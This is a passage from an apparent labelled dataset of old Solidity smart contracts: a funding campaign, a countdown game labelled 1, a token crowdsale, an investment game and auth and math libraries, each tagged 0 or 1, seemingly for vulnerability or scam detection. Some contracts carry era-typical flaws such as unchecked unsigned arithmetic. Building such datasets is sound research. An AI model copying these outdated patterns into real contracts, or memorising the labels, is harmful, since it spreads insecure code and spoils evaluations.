`finalizeFunding()` can only be called after the end of the funding period.\r\r\n\r\r\n    function finalizeFunding() {\r\r\n        if (now < endFundingTime) throw;\r\r\n        tokenContract.changeController(0);\r\r\n    }\r\r\n\r\r\n\r\r\n\/\/\/ @notice `onlyOwner` changes the location that ether is sent\r\r\n\/\/\/ @param _newVaultAddress The address that will receive the ether sent to this\r\r\n\/\/\/  Campaign\r\r\n    function setVault(address _newVaultAddress) onlyOwner {\r\r\n        vaultAddress = _newVaultAddress;\r\r\n    }\r\r\n\r\r\n    \/\/\/\/\/\/\/\/\/\/\r\r\n    \/\/ Safety Methods\r\r\n    \/\/\/\/\/\/\/\/\/\/\r\r\n\r\r\n    \/\/\/ @notice This method can be used by the controller to extract mistakenly\r\r\n    \/\/\/  sent tokens to this contract.\r\r\n    \/\/\/ @param _token The address of the token contract that you want to recover\r\r\n    \/\/\/  set to 0 in case you want to extract ether.\r\r\n    function claimTokens(address _token) public onlyOwner {\r\r\n        if (tokenContract.controller() == address(this)) {\r\r\n            tokenContract.claimTokens(_token);\r\r\n        }\r\r\n        if (_token == 0x0) {\r\r\n            owner.transfer(this.balance);\r\r\n            return;\r\r\n        }\r\r\n\r\r\n        ERC20Token token = ERC20Token(_token);\r\r\n        uint256 balance = token.balanceOf(this);\r\r\n        token.transfer(owner, balance);\r\r\n        ClaimedTokens(_token, owner, balance);\r\r\n    }\r\r\n\r\r\n    event ClaimedTokens(address indexed _token, address indexed _controller, uint _amount);\r\r\n\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.19;\r\r\n\r\r\n\/\/ See biteuthusiast.github.io\r\r\n\r\r\n\/\/ Press the button to become the winner (costs 0.0001)\r\r\n\/\/ Then you can take 10% of the balance whent the countdown reach 0\r\r\n\r\r\n\/\/ Dev fee is 0.0005 per winner\r\r\n\r\r\n\/\/ Enjoy, don&#39;t forget to check this account\r\r\n\/\/ I will refill it\r\r\n\r\r\ncontract Countdown {\r\r\n    uint public deadline = now;\r\r\n    uint private constant waittime = 12 hours;\r\r\n    \r\r\n    address private owner = msg.sender;\r\r\n    address public winner;\r\r\n    \r\r\n    function () public payable {\r\r\n        \r\r\n    }\r\r\n    \r\r\n    function click() public payable {\r\r\n        require(msg.value >= 0.0001 ether);\r\r\n        deadline = now + waittime;\r\r\n        winner = msg.sender;\r\r\n    }\r\r\n    \r\r\n    function withdraw() public {\r\r\n        require(now > deadline);\r\r\n        require(msg.sender == winner);\r\r\n        \r\r\n        deadline = now + waittime;\r\r\n\r\r\n        \/\/ Winner take 10% of the funds\r\r\n        \/\/ And the game continues !\r\r\n        if(this.balance < 0.0005 ether)\r\r\n            msg.sender.transfer(this.balance);\r\r\n        else\r\r\n            msg.sender.transfer(this.balance \/  10);\r\r\n\r\r\n        \/\/ The only fee I will take\r\r\n        if(this.balance > 0.0005 ether)\r\r\n            owner.transfer(0.0005 ether);\r\r\n    }\r\r\n}","label":1}
{"code":"pragma solidity ^0.4.15;\r\r\n\r\r\n\/**\r\r\n * @title SafeMath\r\r\n * @dev Math operations with safety checks that throw on error\r\r\n *\/\r\r\nlibrary SafeMath {\r\r\n    function mul(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n        uint256 c = a * b;\r\r\n        assert(a == 0 || c \/ a == b);\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function div(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n        \/\/ assert(b > 0); \/\/ Solidity automatically throws when dividing by 0\r\r\n        uint256 c = a \/ b;\r\r\n        \/\/ assert(a == b * c + a % b); \/\/ There is no case in which this doesn&#39;t hold\r\r\n        return c;\r\r\n    }\r\r\n\r\r\n    function sub(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n        assert(b <= a);\r\r\n        return a - b;\r\r\n    }\r\r\n\r\r\n    function add(uint256 a, uint256 b) internal constant returns (uint256) {\r\r\n        uint256 c = a + b;\r\r\n        assert(c >= a);\r\r\n        return c;\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Ownable\r\r\n * @dev The Ownable contract has an owner address, and provides basic authorization control\r\r\n * functions, this simplifies the implementation of \"user permissions\".\r\r\n *\/\r\r\ncontract Ownable {\r\r\n    address public owner;\r\r\n\r\r\n\r\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * @dev The Ownable constructor sets the original `owner` of the contract to the sender\r\r\n     * account.\r\r\n     *\/\r\r\n    function Ownable() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * @dev Throws if called by any account other than the owner.\r\r\n     *\/\r\r\n    modifier onlyOwner() {\r\r\n        require(msg.sender == owner);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * @dev Allows the current owner to transfer control of the contract to a newOwner.\r\r\n     * @param newOwner The address to transfer ownership to.\r\r\n     *\/\r\r\n    function transferOwnership(address newOwner) onlyOwner public {\r\r\n        require(newOwner != address(0));\r\r\n        OwnershipTransferred(owner, newOwner);\r\r\n        owner = newOwner;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Pausable\r\r\n * @dev Base contract which allows children to implement an emergency stop mechanism.\r\r\n *\/\r\r\ncontract Pausable is Ownable {\r\r\n    event Pause();\r\r\n    event Unpause();\r\r\n\r\r\n    bool public paused = false;\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * @dev Modifier to make a function callable only when the contract is not paused.\r\r\n     *\/\r\r\n    modifier whenNotPaused() {\r\r\n        require(!paused);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev Modifier to make a function callable only when the contract is paused.\r\r\n     *\/\r\r\n    modifier whenPaused() {\r\r\n        require(paused);\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev called by the owner to pause, triggers stopped state\r\r\n     *\/\r\r\n    function pause() onlyOwner whenNotPaused public {\r\r\n        paused = true;\r\r\n        Pause();\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev called by the owner to unpause, returns to normal state\r\r\n     *\/\r\r\n    function unpause() onlyOwner whenPaused public {\r\r\n        paused = false;\r\r\n        Unpause();\r\r\n    }\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20Basic\r\r\n * @dev Simpler version of ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/179\r\r\n *\/\r\r\ncontract ERC20Basic {\r\r\n    uint256 public totalSupply;\r\r\n    function balanceOf(address who) public constant returns (uint256);\r\r\n    function transfer(address to, uint256 value) public returns (bool);\r\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Basic token\r\r\n * @dev Basic version of StandardToken, with no allowances.\r\r\n *\/\r\r\ncontract BasicToken is ERC20Basic {\r\r\n    using SafeMath for uint256;\r\r\n\r\r\n    mapping(address => uint256) balances;\r\r\n\r\r\n    \/**\r\r\n    * @dev transfer token for a specified address\r\r\n    * @param _to The address to transfer to.\r\r\n    * @param _value The amount to be transferred.\r\r\n    *\/\r\r\n    function transfer(address _to, uint256 _value) public returns (bool) {\r\r\n        require(_to != address(0));\r\r\n        require(_value <= balances[msg.sender]);\r\r\n\r\r\n        \/\/ SafeMath.sub will throw if there is not enough balance.\r\r\n        balances[msg.sender] = balances[msg.sender].sub(_value);\r\r\n        balances[_to] = balances[_to].add(_value);\r\r\n        Transfer(msg.sender, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n    * @dev Gets the balance of the specified address.\r\r\n    * @param _owner The address to query the the balance of.\r\r\n    * @return An uint256 representing the amount owned by the passed address.\r\r\n    *\/\r\r\n    function balanceOf(address _owner) public constant returns (uint256 balance) {\r\r\n        return balances[_owner];\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title ERC20 interface\r\r\n * @dev see https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n *\/\r\r\ncontract ERC20 is ERC20Basic {\r\r\n    function allowance(address owner, address spender) public constant returns (uint256);\r\r\n    function transferFrom(address from, address to, uint256 value) public returns (bool);\r\r\n    function approve(address spender, uint256 value) public returns (bool);\r\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\r\n}\r\r\n\r\r\n\/**\r\r\n * @title Standard ERC20 token\r\r\n *\r\r\n * @dev Implementation of the basic standard token.\r\r\n * @dev https:\/\/github.com\/ethereum\/EIPs\/issues\/20\r\r\n * @dev Based on code by FirstBlood: https:\/\/github.com\/Firstbloodio\/token\/blob\/master\/smart_contract\/FirstBloodToken.sol\r\r\n *\/\r\r\ncontract StandardToken is ERC20, BasicToken {\r\r\n\r\r\n    mapping (address => mapping (address => uint256)) internal allowed;\r\r\n\r\r\n\r\r\n    \/**\r\r\n     * @dev Transfer tokens from one address to another\r\r\n     * @param _from address The address which you want to send tokens from\r\r\n     * @param _to address The address which you want to transfer to\r\r\n     * @param _value uint256 the amount of tokens to be transferred\r\r\n     *\/\r\r\n    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) {\r\r\n        require(_to != address(0));\r\r\n        require(_value <= balances[_from]);\r\r\n        require(_value <= allowed[_from][msg.sender]);\r\r\n\r\r\n        balances[_from] = balances[_from].sub(_value);\r\r\n        balances[_to] = balances[_to].add(_value);\r\r\n        allowed[_from][msg.sender] = allowed[_from][msg.sender].sub(_value);\r\r\n        Transfer(_from, _to, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev Approve the passed address to spend the specified amount of tokens on behalf of msg.sender.\r\r\n     *\r\r\n     * Beware that changing an allowance with this method brings the risk that someone may use both the old\r\r\n     * and the new allowance by unfortunate transaction ordering. One possible solution to mitigate this\r\r\n     * race condition is to first reduce the spender&#39;s allowance to 0 and set the desired value afterwards:\r\r\n     * https:\/\/github.com\/ethereum\/EIPs\/issues\/20#issuecomment-263524729\r\r\n     * @param _spender The address which will spend the funds.\r\r\n     * @param _value The amount of tokens to be spent.\r\r\n     *\/\r\r\n    function approve(address _spender, uint256 _value) public returns (bool) {\r\r\n        allowed[msg.sender][_spender] = _value;\r\r\n        Approval(msg.sender, _spender, _value);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * @dev Function to check the amount of tokens that an owner allowed to a spender.\r\r\n     * @param _owner address The address which owns the funds.\r\r\n     * @param _spender address The address which will spend the funds.\r\r\n     * @return A uint256 specifying the amount of tokens still available for the spender.\r\r\n     *\/\r\r\n    function allowance(address _owner, address _spender) public constant returns (uint256 remaining) {\r\r\n        return allowed[_owner][_spender];\r\r\n    }\r\r\n\r\r\n    \/**\r\r\n     * approve should be called when allowed[_spender] == 0. To increment\r\r\n     * allowed value is better to use this function to avoid 2 calls (and wait until\r\r\n     * the first transaction is mined)\r\r\n     * From MonolithDAO Token.sol\r\r\n     *\/\r\r\n    function increaseApproval (address _spender, uint _addedValue) public returns (bool success) {\r\r\n        allowed[msg.sender][_spender] = allowed[msg.sender][_spender].add(_addedValue);\r\r\n        Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n    function decreaseApproval (address _spender, uint _subtractedValue) public returns (bool success) {\r\r\n        uint oldValue = allowed[msg.sender][_spender];\r\r\n        if (_subtractedValue > oldValue) {\r\r\n            allowed[msg.sender][_spender] = 0;\r\r\n        } else {\r\r\n            allowed[msg.sender][_spender] = oldValue.sub(_subtractedValue);\r\r\n        }\r\r\n        Approval(msg.sender, _spender, allowed[msg.sender][_spender]);\r\r\n        return true;\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\ncontract IRateOracle {\r\r\n    function converted(uint256 weis) external constant returns (uint256);\r\r\n}\r\r\n\r\r\ncontract PynToken is StandardToken, Ownable {\r\r\n\r\r\n    string public constant name = \"Paycentos Token\";\r\r\n    string public constant symbol = \"PYN\";\r\r\n    uint256 public constant decimals = 18;\r\r\n    uint256 public totalSupply = 450000000 * (uint256(10) ** decimals);\r\r\n\r\r\n    mapping(address => bool) public specialAccounts;\r\r\n\r\r\n    function PynToken(address wallet) public {\r\r\n        balances[wallet] = totalSupply;\r\r\n        specialAccounts[wallet]=true;\r\r\n        Transfer(0x0, wallet, totalSupply);\r\r\n    }\r\r\n\r\r\n    function addSpecialAccount(address account) external onlyOwner {\r\r\n        specialAccounts[account] = true;\r\r\n    }\r\r\n\r\r\n    bool public firstSaleComplete;\r\r\n\r\r\n    function markFirstSaleComplete() public {\r\r\n        if (specialAccounts[msg.sender]) {\r\r\n            firstSaleComplete = true;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function isOpen() public constant returns (bool) {\r\r\n        return firstSaleComplete || specialAccounts[msg.sender];\r\r\n    }\r\r\n\r\r\n    function transfer(address _to, uint _value) public returns (bool) {\r\r\n        return isOpen() && super.transfer(_to, _value);\r\r\n    }\r\r\n\r\r\n    function transferFrom(address _from, address _to, uint _value) public returns (bool) {\r\r\n        return isOpen() && super.transferFrom(_from, _to, _value);\r\r\n    }\r\r\n\r\r\n\r\r\n    event Burn(address indexed burner, uint256 value);\r\r\n\r\r\n    \/**\r\r\n     * @dev Burns a specific amount of tokens.\r\r\n     * @param _value The amount of token to be burned.\r\r\n     *\/\r\r\n    function burn(uint256 _value) public {\r\r\n        require(_value >= 0);\r\r\n        require(_value <= balances[msg.sender]);\r\r\n        \/\/ no need to require value <= totalSupply, since that would imply the\r\r\n        \/\/ sender&#39;s balance is greater than the totalSupply, which *should* be an assertion failure\r\r\n\r\r\n        address burner = msg.sender;\r\r\n        balances[burner] = balances[burner].sub(_value);\r\r\n        totalSupply = totalSupply.sub(_value);\r\r\n        Burn(burner, _value);\r\r\n    }\r\r\n\r\r\n}\r\r\n\r\r\n\r\r\ncontract PynTokenCrowdsale is Pausable {\r\r\n    using SafeMath for uint256;\r\r\n\r\r\n    uint256 public totalRaised;\r\r\n    \/\/Crowdsale start\r\r\n    uint256 public startTimestamp;\r\r\n    \/\/Crowdsale duration: 30 days\r\r\n    uint256 public duration = 28 days;\r\r\n    \/\/adress of Oracle with ETH to PYN rate\r\r\n    IRateOracle public rateOracle;\r\r\n    \/\/Address of wallet\r\r\n    address public fundsWallet;\r\r\n    \/\/ token contract\r\r\n    PynToken public token;\r\r\n    \/\/ bonus applied: 127 means additional 27%\r\r\n    uint16 public bonus1;\r\r\n    uint16 public bonus2;\r\r\n    uint16 public bonus3;\r\r\n    \/\/ if true bonus applied to every purchase, otherwise only if msg.sender already has some PYN tokens\r\r\n    bool public bonusForEveryone;\r\r\n\r\r\n    function PynTokenCrowdsale(\r\r\n    address _fundsWallet,\r\r\n    address _pynToken,\r\r\n    uint256 _startTimestamp,\r\r\n    address _rateOracle,\r\r\n    uint16 _bonus1,\r\r\n    uint16 _bonus2,\r\r\n    uint16 _bonus3,\r\r\n    bool _bonusForEveryone) public {\r\r\n        fundsWallet = _fundsWallet;\r\r\n        token = PynToken(_pynToken);\r\r\n        startTimestamp = _startTimestamp;\r\r\n        rateOracle = IRateOracle(_rateOracle);\r\r\n        bonus1 = _bonus1;\r\r\n        bonus2 = _bonus2;\r\r\n        bonus3 = _bonus3;\r\r\n        bonusForEveryone = _bonusForEveryone;\r\r\n    }\r\r\n\r\r\n    bool internal capReached;\r\r\n\r\r\n    function isCrowdsaleOpen() public constant returns (bool) {\r\r\n        return !capReached && now >= startTimestamp && now <= startTimestamp + duration;\r\r\n    }\r\r\n\r\r\n    modifier isOpen() {\r\r\n        require(isCrowdsaleOpen());\r\r\n        _;\r\r\n    }\r\r\n\r\r\n\r\r\n    function() public payable {\r\r\n        buyTokens();\r\r\n    }\r\r\n\r\r\n    function buyTokens() public isOpen whenNotPaused payable {\r\r\n\r\r\n        uint256 payedEther = msg.value;\r\r\n        uint256 acceptedEther = 0;\r\r\n        uint256 refusedEther = 0;\r\r\n\r\r\n        uint256 expected = calculateTokenAmount(payedEther);\r\r\n        uint256 available = token.balanceOf(this);\r\r\n        uint256 transfered = 0;\r\r\n\r\r\n        if (available < expected) {\r\r\n            acceptedEther = payedEther.mul(available).div(expected);\r\r\n            refusedEther = payedEther.sub(acceptedEther);\r\r\n            transfered = available;\r\r\n            capReached = true;\r\r\n        } else {\r\r\n            acceptedEther = payedEther;\r\r\n            transfered = expected;\r\r\n        }\r\r\n\r\r\n        totalRaised = totalRaised.add(acceptedEther);\r\r\n\r\r\n        token.transfer(msg.sender, transfered);\r\r\n        fundsWallet.transfer(acceptedEther);\r\r\n        if (refusedEther > 0) {\r\r\n            msg.sender.transfer(refusedEther);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function calculateTokenAmount(uint256 weiAmount) public constant returns (uint256) {\r\r\n        uint256 converted = rateOracle.converted(weiAmount);\r\r\n        if (bonusForEveryone || token.balanceOf(msg.sender) > 0) {\r\r\n\r\r\n            if (now <= startTimestamp + 10 days) {\r\r\n                if (now <= startTimestamp + 5 days) {\r\r\n                    if (now <= startTimestamp + 2 days) {\r\r\n                        \/\/+27% bonus during first 2 days\r\r\n                        return converted.mul(bonus1).div(100);\r\r\n                    }\r\r\n                    \/\/+18% bonus during day 3 - 5\r\r\n                    return converted.mul(bonus2).div(100);\r\r\n                }\r\r\n                \/\/+12% bonus during day 6 - 10\r\r\n                return converted.mul(bonus3).div(100);\r\r\n            }\r\r\n        }\r\r\n        return converted;\r\r\n    }\r\r\n\r\r\n    function success() public returns (bool) {\r\r\n        require(now > startTimestamp);\r\r\n        uint256 balance = token.balanceOf(this);\r\r\n        if (balance == 0) {\r\r\n            capReached = true;\r\r\n            token.markFirstSaleComplete();\r\r\n            return true;\r\r\n        }\r\r\n\r\r\n        if (now >= startTimestamp + duration) {\r\r\n            token.burn(balance);\r\r\n            capReached = true;\r\r\n            token.markFirstSaleComplete();\r\r\n            return true;\r\r\n        }\r\r\n\r\r\n        return false;\r\r\n    }\r\r\n}","label":0}
{"code":"pragma solidity ^0.4.10;\r\r\n\r\r\ncontract Metronome {\r\r\n\r\r\n    \/\/ This is the constructor whose code is\r\r\n    \/\/ run only when the contract is created.\r\r\n    function Metronome() {\r\r\n    }\r\r\n    \r\r\n    \r\r\n    \/\/ total amount invested\r\r\n    uint public invested = 0;\r\r\n    \r\r\n    \/\/ stores the last ping of every participants\r\r\n    mapping (address => uint) public lastPing;\r\r\n    \/\/ stores the balance of each participant\r\r\n    mapping (address => uint) public balanceOf;\r\r\n    \/\/ stores the value of rewards the last time a player collected rewards\r\r\n    mapping (address => uint) public lastRewards;\r\r\n\r\r\n    uint public constant largeConstant = 1000000 ether;\r\r\n    \/\/ cumulative ratio of rewards over invested (multiplied by largeConstant)\r\r\n    uint public cumulativeRatios = 0;\r\r\n    \r\r\n    \/\/ this array is not used in the rules of the game\r\r\n    \/\/ it enables players to check the state of other players more easily\r\r\n    mapping (uint => address) public participants;\r\r\n    uint public countParticipants = 0;\r\r\n    \r\r\n    \r\r\n    \/** Private and Constant functions *\/\r\r\n    \r\r\n    \/\/ adds a player to the array of participants\r\r\n    function addPlayer(address a) private {\r\r\n        if (lastPing[a] == 0) {\r\r\n            participants[countParticipants] = a;\r\r\n            countParticipants = countParticipants + 1;\r\r\n        }\r\r\n        lastPing[a] = now;\r\r\n    }\r\r\n    \r\r\n    \r\r\n    \/\/ updates the balance and updates the total invested amount\r\r\n    function modifyBalance(address a, uint x) private {\r\r\n        balanceOf[a] = balanceOf[a] + x;\r\r\n        invested = invested + x;\r\r\n    }\r\r\n    \r\r\n    \/\/ creates a new reward that can be claimed by users\r\r\n    function createReward(uint value, uint oldTotal) private {\r\r\n        if (oldTotal > 0)\r\r\n            cumulativeRatios = cumulativeRatios + (value * largeConstant) \/ oldTotal;\r\r\n    }\r\r\n    \r\r\n    \/\/ function called to forbid a player from claiming all past rewards\r\r\n    function forbid(address a) private {\r\r\n        lastRewards[a] = cumulativeRatios;\r\r\n    }\r\r\n    \r\r\n    \/\/ function to compute the next reward of a player\r\r\n    function getReward(address a) constant returns (uint) {\r\r\n        uint rewardsDifference = cumulativeRatios - lastRewards[a];\r\r\n        return (rewardsDifference * balanceOf[a]) \/ largeConstant;\r\r\n    }\r\r\n    \r\r\n    \/\/ function to compute the lost amount\r\r\n    function losingAmount(address a, uint toShare) constant returns (uint) {\r\r\n        return toShare - (((toShare*largeConstant)\/invested)*balanceOf[a]) \/ largeConstant;\r\r\n    }\r\r\n    \r\r\n    \/** Public functions *\/\r\r\n    \r\r\n    \/\/ to be called every day\r\r\n    function idle() {\r\r\n        lastPing[msg.sender] = now;\r\r\n    }\r\r\n    \r\r\n    \/\/ function called when a user wants to invest in the contract\r\r\n    \/\/ after calling this function you cannot claim past rewards\r\r\n    function invest() payable {\r\r\n        uint reward = getReward(msg.sender);\r\r\n        addPlayer(msg.sender);\r\r\n        modifyBalance(msg.sender, msg.value);\r\r\n        forbid(msg.sender);\r\r\n        createReward(reward, invested);\r\r\n    }\r\r\n    \r\r\n    \/\/ function called when a user wants to divest\r\r\n    function divest(uint256 value) {\r\r\n        require(value <= balanceOf[msg.sender]);\r\r\n        \r\r\n        uint reward = getReward(msg.sender);\r\r\n        modifyBalance(msg.sender, -value);\r\r\n        forbid(msg.sender);\r\r\n        createReward(reward, invested);\r\r\n        msg.sender.transfer(value);\r\r\n    }\r\r\n    \r\r\n    \/\/ claims the rewards\r\r\n    function claimRewards() {\r\r\n        uint reward = getReward(msg.sender);\r\r\n        modifyBalance(msg.sender,reward);\r\r\n        forbid(msg.sender);\r\r\n    }\r\r\n    \r\r\n    \/\/ used to take create a reward from the funds of someone who has not\r\r\n    \/\/ idled in the last 10 minutes\r\r\n    function poke(address a) {\r\r\n        require(now > lastPing[a] + 14 hours && balanceOf[a] > 0);\r\r\n        \r\r\n        uint missed = getReward(a);\r\r\n        uint toShare = balanceOf[a] \/ 10;\r\r\n        uint toLose = losingAmount(a, toShare);\r\r\n        \r\r\n        createReward(toShare, invested);\r\r\n        modifyBalance(a, -toLose);\r\r\n        forbid(a);\r\r\n        lastPing[a] = now;\r\r\n        createReward(missed, invested);\r\r\n    }\r\r\n}","label":0}
{"code":"contract Whitelist {\r\r\n    address public owner;\r\r\n    address public sale;\r\r\n\r\r\n    mapping (address => uint) public accepted;\r\r\n\r\r\n    function Whitelist() {\r\r\n        owner = msg.sender;\r\r\n    }\r\r\n\r\r\n    \/\/ Amount in WEI i.e. amount = 1 means 1 WEI\r\r\n    function accept(address a, uint amount) {\r\r\n        assert (msg.sender == owner || msg.sender == sale);\r\r\n\r\r\n        accepted[a] = amount;\r\r\n    }\r\r\n\r\r\n    function setSale(address sale_) {\r\r\n        assert (msg.sender == owner);\r\r\n\r\r\n        sale = sale_;\r\r\n    } \r\r\n}\r\r\n\r\r\n\r\r\ncontract DSExec {\r\r\n    function tryExec( address target, bytes calldata, uint value)\r\r\n             internal\r\r\n             returns (bool call_ret)\r\r\n    {\r\r\n        return target.call.value(value)(calldata);\r\r\n    }\r\r\n    function exec( address target, bytes calldata, uint value)\r\r\n             internal\r\r\n    {\r\r\n        if(!tryExec(target, calldata, value)) {\r\r\n            throw;\r\r\n        }\r\r\n    }\r\r\n\r\r\n    \/\/ Convenience aliases\r\r\n    function exec( address t, bytes c )\r\r\n        internal\r\r\n    {\r\r\n        exec(t, c, 0);\r\r\n    }\r\r\n    function exec( address t, uint256 v )\r\r\n        internal\r\r\n    {\r\r\n        bytes memory c; exec(t, c, v);\r\r\n    }\r\r\n    function tryExec( address t, bytes c )\r\r\n        internal\r\r\n        returns (bool)\r\r\n    {\r\r\n        return tryExec(t, c, 0);\r\r\n    }\r\r\n    function tryExec( address t, uint256 v )\r\r\n        internal\r\r\n        returns (bool)\r\r\n    {\r\r\n        bytes memory c; return tryExec(t, c, v);\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\ncontract DSAuthority {\r\r\n    function canCall(\r\r\n        address src, address dst, bytes4 sig\r\r\n    ) constant returns (bool);\r\r\n}\r\r\n\r\r\ncontract DSAuthEvents {\r\r\n    event LogSetAuthority (address indexed authority);\r\r\n    event LogSetOwner     (address indexed owner);\r\r\n}\r\r\n\r\r\ncontract DSAuth is DSAuthEvents {\r\r\n    DSAuthority  public  authority;\r\r\n    address      public  owner;\r\r\n\r\r\n    function DSAuth() {\r\r\n        owner = msg.sender;\r\r\n        LogSetOwner(msg.sender);\r\r\n    }\r\r\n\r\r\n    function setOwner(address owner_)\r\r\n        auth\r\r\n    {\r\r\n        owner = owner_;\r\r\n        LogSetOwner(owner);\r\r\n    }\r\r\n\r\r\n    function setAuthority(DSAuthority authority_)\r\r\n        auth\r\r\n    {\r\r\n        authority = authority_;\r\r\n        LogSetAuthority(authority);\r\r\n    }\r\r\n\r\r\n    modifier auth {\r\r\n        assert(isAuthorized(msg.sender, msg.sig));\r\r\n        _;\r\r\n    }\r\r\n\r\r\n    function isAuthorized(address src, bytes4 sig) internal returns (bool) {\r\r\n        if (src == address(this)) {\r\r\n            return true;\r\r\n        } else if (src == owner) {\r\r\n            return true;\r\r\n        } else if (authority == DSAuthority(0)) {\r\r\n            return false;\r\r\n        } else {\r\r\n            return authority.canCall(src, this, sig);\r\r\n        }\r\r\n    }\r\r\n\r\r\n    function assert(bool x) internal {\r\r\n        if (!x) throw;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\ncontract DSNote {\r\r\n    event LogNote(\r\r\n        bytes4   indexed  sig,\r\r\n        address  indexed  guy,\r\r\n        bytes32  indexed  foo,\r\r\n        bytes32  indexed  bar,\r\r\n\tuint\t \t  wad,\r\r\n        bytes             fax\r\r\n    ) anonymous;\r\r\n\r\r\n    modifier note {\r\r\n        bytes32 foo;\r\r\n        bytes32 bar;\r\r\n\r\r\n        assembly {\r\r\n            foo := calldataload(4)\r\r\n            bar := calldataload(36)\r\r\n        }\r\r\n\r\r\n        LogNote(msg.sig, msg.sender, foo, bar, msg.value, msg.data);\r\r\n\r\r\n        _;\r\r\n    }\r\r\n}\r\r\n\r\r\n\r\r\n\r\r\ncontract DSMath {\r\r\n    \r\r\n    \/*\r\r\n    standard uint256 functions\r\r\n     *\/\r\r\n\r\r\n    function add(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        assert((z = x + y) >= x);\r\r\n    }\r\r\n\r\r\n    function sub(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        assert((z = x - y) <= x);\r\r\n    }\r\r\n\r\r\n    function mul(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        z = x * y;\r\r\n        assert(x == 0 || z \/ x == y);\r\r\n    }\r\r\n\r\r\n    function div(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        z = x \/ y;\r\r\n    }\r\r\n\r\r\n    function min(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        return x <= y ? x : y;\r\r\n    }\r\r\n    function max(uint256 x, uint256 y) constant internal returns (uint256 z) {\r\r\n        return x >= y ? x : y;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    uint128 functions (h is for half)\r\r\n     *\/\r\r\n\r\r\n\r\r\n    function hadd(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        assert((z = x + y) >= x);\r\r\n    }\r\r\n\r\r\n    function hsub(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        assert((z = x - y) <= x);\r\r\n    }\r\r\n\r\r\n    function hmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = x * y;\r\r\n        assert(x == 0 || z \/ x == y);\r\r\n    }\r\r\n\r\r\n    function hdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = x \/ y;\r\r\n    }\r\r\n\r\r\n    function hmin(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        return x <= y ? x : y;\r\r\n    }\r\r\n    function hmax(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        return x >= y ? x : y;\r\r\n    }\r\r\n\r\r\n\r\r\n    \/*\r\r\n    int256 functions\r\r\n     *\/\r\r\n\r\r\n    function imin(int256 x, int256 y) constant internal returns (int256 z) {\r\r\n        return x <= y ? x : y;\r\r\n    }\r\r\n    function imax(int256 x, int256 y) constant internal returns (int256 z) {\r\r\n        return x >= y ? x : y;\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    WAD math\r\r\n     *\/\r\r\n\r\r\n    uint128 constant WAD = 10 ** 18;\r\r\n\r\r\n    function wadd(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hadd(x, y);\r\r\n    }\r\r\n\r\r\n    function wsub(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hsub(x, y);\r\r\n    }\r\r\n\r\r\n    function wmul(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = cast((uint256(x) * y + WAD \/ 2) \/ WAD);\r\r\n    }\r\r\n\r\r\n    function wdiv(uint128 x, uint128 y) constant internal returns (uint128 z) {\r\r\n        z = cast((uint256(x) * WAD + y \/ 2) \/ y);\r\r\n    }\r\r\n\r\r\n    function wmin(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hmin(x, y);\r\r\n    }\r\r\n    function wmax(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hmax(x, y);\r\r\n    }\r\r\n\r\r\n    \/*\r\r\n    RAY math\r\r\n     *\/\r\r\n\r\r\n    uint128 constant RAY = 10 ** 27;\r\r\n\r\r\n    function radd(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return hadd(x, y);\r\r\n    }\r\r\n\r\r\n    function rsub(uint128 x, uint128 y) constant internal returns (uint128) {\r\r\n        return 